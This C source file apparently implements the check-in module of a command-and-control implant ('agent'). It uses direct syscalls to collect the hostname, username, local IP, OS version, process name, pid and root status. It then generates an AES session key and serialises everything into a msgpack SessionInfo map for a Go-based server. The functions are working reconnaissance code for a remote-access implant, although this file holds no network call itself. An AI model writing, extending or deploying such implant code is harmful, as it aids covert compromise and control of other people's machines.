#include "agent_info.h"
#include "crt.h"
#include "types.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

// Read a file into buf via direct syscalls, null-terminate
static int read_file(const char* path, char* buf, int buf_size) {
    int fd = sys_open(path, 0 /* O_RDONLY */, 0);
    if (fd < 0) return -1;
    long n = sys_read(fd, buf, buf_size - 1);
    sys_close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    // Strip trailing newline
    if (n > 0 && buf[n-1] == '\n') buf[n-1] = '\0';
    return 0;
}

int agent_info_hostname(char* buf, int len) {
    if (read_file("/proc/sys/kernel/hostname", buf, len) == 0)
        return 0;
    ax_strncpy(buf, "unknown", len - 1);
    return 0;
}

int agent_info_username(char* buf, int len) {
    // Read /etc/passwd, find line matching our UID
    int uid = sys_getuid();

    char passwd[4096];
    int fd = sys_open("/etc/passwd", 0, 0);
    if (fd < 0) {
        ax_strncpy(buf, "unknown", len - 1);
        return 0;
    }

    long n = sys_read(fd, passwd, sizeof(passwd) - 1);
    sys_close(fd);
    if (n <= 0) {
        ax_strncpy(buf, "unknown", len - 1);
        return 0;
    }
    passwd[n] = '\0';

    // Parse each line: username:x:uid:gid:...
    char* line = passwd;
    while (*line) {
        char* username_start = line;
        char* colon1 = (char*)0;
        char* colon2 = (char*)0;
        char* colon3 = (char*)0;
        char* p = line;
        int colons = 0;

        while (*p && *p != '\n') {
            if (*p == ':') {
                colons++;
                if (colons == 1) colon1 = p;
                else if (colons == 2) colon2 = p;
                else if (colons == 3) colon3 = p;
            }
            p++;
        }

        if (colon2 && colon3) {
            // Parse UID between colon2+1 and colon3
            int parsed_uid = 0;
            char* u = colon2 + 1;
            while (u < colon3 && *u >= '0' && *u <= '9') {
                parsed_uid = parsed_uid * 10 + (*u - '0');
                u++;
            }

            if (parsed_uid == uid && colon1) {
                int ulen = (int)(colon1 - username_start);
                if (ulen >= len) ulen = len - 1;
                ax_memcpy(buf, username_start, ulen);
                buf[ulen] = '\0';
                return 0;
            }
        }

        // Advance to next line
        if (*p == '\n') p++;
        line = p;
    }

    ax_strncpy(buf, "unknown", len - 1);
    return 0;
}

int agent_info_ipaddr(char* buf, int len) {
    // Read /proc/net/fib_trie or parse /proc/net/if_inet6 is complex
    // Simpler: read from /proc/net/tcp or use ioctl — but for Phase 1,
    // just read /proc/net/route to find default gateway interface, then
    // read that interface's addr. Simplest: read /proc/self/net/fib_trie.
    //
    // For now, parse first non-loopback from /proc/net/fib_trie
    // Format of interesting lines: "     |-- X.X.X.X" followed by "/32 host LOCAL"
    buf[0] = '\0';

    char fib[8192];
    int fd = sys_open("/proc/net/fib_trie", 0, 0);
    if (fd < 0) return 0;

    long total = 0;
    long n;
    while (total < (long)sizeof(fib) - 1) {
        n = sys_read(fd, fib + total, sizeof(fib) - 1 - total);
        if (n <= 0) break;
        total += n;
    }
    sys_close(fd);
    if (total <= 0) return 0;
    fib[total] = '\0';

    // Find LOCAL addresses that aren't 127.x.x.x
    char* p = fib;
    while (*p) {
        // Look for "|-- " pattern
        if (p[0] == '|' && p[1] == '-' && p[2] == '-' && p[3] == ' ') {
            char* ip_start = p + 4;
            // Read until newline
            char* ip_end = ip_start;
            while (*ip_end && *ip_end != '\n') ip_end++;

            int ip_len = (int)(ip_end - ip_start);
            // Check if this is followed by a LOCAL line
            char* next = ip_end;
            if (*next == '\n') next++;
            // Look for "LOCAL" in the next few lines
            int found_local = 0;
            for (int lines = 0; lines < 3 && *next; lines++) {
                if (ax_strstr(next, "LOCAL")) {
                    found_local = 1;
                    break;
                }
                while (*next && *next != '\n') next++;
                if (*next == '\n') next++;
            }

            if (found_local && ip_len > 0 && ip_len < len) {
                // Skip 127.x.x.x
                if (!(ip_start[0] == '1' && ip_start[1] == '2' && ip_start[2] == '7' && ip_start[3] == '.')) {
                    ax_memcpy(buf, ip_start, ip_len);
                    buf[ip_len] = '\0';
                    return 0;
                }
            }
        }
        p++;
    }

    return 0;
}

int agent_info_osversion(char* buf, int len) {
    // Try /etc/os-release first
    char osrel[2048];
    if (read_file("/etc/os-release", osrel, sizeof(osrel)) == 0) {
        // Look for PRETTY_NAME="..."
        char* key = ax_strstr(osrel, "PRETTY_NAME=");
        if (key) {
            key += 12; // skip "PRETTY_NAME="
            if (*key == '"') key++;
            char* end = key;
            while (*end && *end != '"' && *end != '\n') end++;
            int vlen = (int)(end - key);
            if (vlen >= len) vlen = len - 1;
            ax_memcpy(buf, key, vlen);
            buf[vlen] = '\0';
            return 0;
        }
    }

    // Fallback: /proc/version
    if (read_file("/proc/version", buf, len) == 0)
        return 0;

    ax_strncpy(buf, "Linux", len - 1);
    return 0;
}

// Get process name from /proc/self/comm
static void get_process_name(char* buf, int len) {
    if (read_file("/proc/self/comm", buf, len) == 0)
        return;
    ax_strncpy(buf, "unknown", len - 1);
}

int create_session_info(mp_writer_t* w, uint8_t* session_key) {
    // Generate random session key (16 bytes for AES-128)
    if (ax_random_bytes(session_key, 16) != 0) return -1;

    char hostname[256] = {0};
    agent_info_hostname(hostname, sizeof(hostname));

    char username[256] = {0};
    agent_info_username(username, sizeof(username));

    char process[256] = {0};
    get_process_name(process, sizeof(process));

    char ip[64] = {0};
    agent_info_ipaddr(ip, sizeof(ip));

    char os_version[256] = {0};
    agent_info_osversion(os_version, sizeof(os_version));

    int pid = sys_getpid();
    int elevated = (sys_geteuid() == 0) ? 1 : 0;

    // Write SessionInfo as msgpack map
    // vmihailenco/msgpack v5 serializes in DECLARATION order
    // Go struct: process, pid, user, host, ipaddr, elevated, acp, oem, os, os_version, encrypt_key
    mp_write_map(w, 11);

    mp_write_kv_str(w, "process", process);
    mp_write_kv_int(w, "pid", pid);
    mp_write_kv_str(w, "user", username);
    mp_write_kv_str(w, "host", hostname);
    mp_write_kv_str(w, "ipaddr", ip);
    mp_write_kv_bool(w, "elevated", elevated);
    mp_write_kv_uint(w, "acp", 65001);        // UTF-8 code page
    mp_write_kv_uint(w, "oem", 65001);
    mp_write_kv_str(w, "os", "linux");
    mp_write_kv_str(w, "os_version", os_version);
    mp_write_kv_bin(w, "encrypt_key", session_key, 16);

    return 0;
}
